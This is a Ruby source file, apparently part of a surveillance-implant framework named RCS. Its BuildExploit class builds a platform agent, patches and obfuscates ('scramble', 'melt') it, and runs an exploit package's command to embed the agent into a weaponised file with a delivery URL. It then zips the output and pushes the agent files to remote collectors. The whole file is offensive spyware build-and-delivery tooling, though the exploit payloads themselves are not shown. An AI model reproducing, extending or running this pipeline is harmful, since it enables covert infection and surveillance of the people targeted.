#
# Local exploit creation
#

require_relative '../network_controller'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildExploit < Build

  def initialize
    super
    @platform = 'exploit'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"
    @factory = params['_id']
  end

  def unpack
    # nothing to unpack here
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    @exploit = Exploit.get params['exploit']

    raise "Exploit #{params['exploit']} not found" if @exploit.nil?

    # build the agent for the right platform
    build = Build.factory(@exploit['platform'].to_sym)
    build.load({'_id' => @factory})
    build.unpack
    build.patch params['binary'].dup
    build.scramble
    build.melt params['melt'].dup
    agent = build.outputs.first
    FileUtils.cp(File.join(build.tmpdir, agent), path('agent'))
    @outputs = ['agent']
    build.clean

    # unpack the exploit
    Zip::ZipFile.open(@exploit[:package]) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end

  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    @appname = params['appname'] || 'exploit'

    FileUtils.mv path('agent'), path(@appname)
    @outputs.delete 'agent'
    @outputs.push @appname

    @appname_ext = @appname + '.' + @exploit['format']

    # invoke the creation of the exploit
    command = @exploit['exec']
    command.gsub!('%OUTPUT%', path(@appname_ext))
    command.gsub!('%AGENT%', path('agent'))
    command.gsub!('%URL%', params['url'])
    command.gsub!('%FILE%', path('input'))

    # split the command and the arguments
    m = Regexp.new('([\w\.]+)(?: )(.*)', Regexp::IGNORECASE).match(command)
    command = m[1]
    # if the command is local, use the full path to the temp dir
    command = path(command) if File.exist? path(command)
    # on windows we have to invoke the interpreter explicitly
    command.prepend('ruby ') if command.end_with? '.rb'
    command.prepend('python ') if command.end_with? '.py'
    params = m[2]

    CrossPlatform.exec command, params, {:chdir => path('')}

    File.exist? path(@appname_ext) or raise("Exploit creation failed. No output file")

    @outputs << @appname_ext

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname_ext, "w") { |f| f.write File.open(path(@appname_ext), 'rb') {|f| f.read} }
    end

    @outputs.insert(0, 'output.zip')
  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params}"

    push = @outputs.dup
    push.delete 'output.zip'
    push.delete @appname_ext

    # put them on the collectors
    push.each do |o|
      content = File.open(path(o), 'rb') {|f| f.read}
      NetworkController.put(o, content)
    end
    
  end

end

class Exploit
  extend RCS::Tracer

  class << self
    def reload_list
      @list = []
      trace :debug, "Scanning Exploits..."

      begin
        exp_dir = File.join(Dir.pwd, 'exploits')
        if File.exist? exp_dir
          Dir[exp_dir + '/**'].each do |exp|
            # load the info of each exploit from the package file
            Zip::ZipFile.open(exp) do |z|
              info = z.file.open('info.yaml', 'r') {|f| f.read}
              info = YAML.load(info)
              info[:package] = exp
              @list << info
            end
          end
        end
      rescue Exception => e
        trace :error, "Cannot load exploit list: #{e.message}"
      end
      
      trace :debug, "Exploit found: #{@list.size}"
    end

    def get (id)
      reload_list

      @list.each do |e|
        return e if e['id'] == id
      end
      
      return nil
    end
  end

end

end #DB::
end #RCS::
